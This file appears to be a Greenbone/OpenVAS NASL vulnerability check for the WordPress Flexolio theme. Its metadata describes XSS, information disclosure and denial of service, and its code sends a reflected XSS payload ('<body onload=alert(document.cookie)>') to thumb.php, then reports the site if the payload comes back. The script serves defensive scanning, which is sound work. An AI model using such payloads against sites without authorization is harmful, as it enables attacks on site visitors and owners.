# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:quarterpixel:flexolio";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804578");
  script_version("2024-02-20T05:05:48+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-02-20 05:05:48 +0000 (Tue, 20 Feb 2024)");
  script_tag(name:"creation_date", value:"2014-05-09 16:46:52 +0530 (Fri, 09 May 2014)");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("WordPress Flexolio Multiple Vulnerabilities (May 2014)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/theme/flexolio/detected");

  script_tag(name:"summary", value:"The WordPress Flexolio theme is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks whether it is able to read the cookie or not.");

  script_tag(name:"insight", value:"Input passed via the 'xml', 'src' GET parameter to 'thumb.php' and 'cu3er.swf'
  scripts are not properly sanitized before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code, disclose potentially sensitive information, and cause a denial of service.");

  script_tag(name:"affected", value:"WordPress Flexolio theme.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126475");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/May/15");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

url = dir + "/inc/thumb.php?src=1%3Cbody%20onload=alert(document.cookie)%3E.jpg";

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<body onload=alert\(document\.cookie\)>",
   extra_check:make_list("file not found", ".jpg"))) {
  security_message(port);
  exit(0);
}

exit(0);
